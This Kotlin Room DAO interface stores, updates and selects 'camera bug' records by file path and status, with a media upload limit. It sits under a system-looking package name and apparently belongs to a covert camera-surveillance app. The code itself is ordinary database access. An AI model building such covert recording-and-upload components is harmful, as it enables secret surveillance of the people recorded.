package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.CameraBug
import com.android.services.util.AppConstants

@Dao
interface CameraBugDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(cameraBug: CameraBug)

    @Query("Update camera_bug set status = :status where file_path = :file")
    fun update(file: String, status: Int): Int

    @Query("Select * from camera_bug where status = :status order by start_datetime DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllCameraBugs(status: Int): List<CameraBug>

}